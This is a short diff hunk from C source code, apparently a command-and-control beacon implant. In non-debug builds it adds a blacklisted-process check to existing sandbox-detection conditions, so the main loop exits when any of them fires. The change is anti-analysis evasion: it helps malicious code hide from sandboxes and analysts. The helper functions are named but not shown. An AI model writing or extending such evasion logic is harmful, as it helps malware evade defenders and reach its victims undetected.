@@ -427,7 +427,7 @@ VOID BeaconMainLoop
 
 	while (TRUE) {
 #ifndef _DEBUG
-		if (DetectSandbox1() || DetectSandbox2()) {
+		if (DetectSandbox1() || DetectSandbox2() || CheckForBlackListProcess()) {
 			goto CLEANUP;
 		}
 #endif
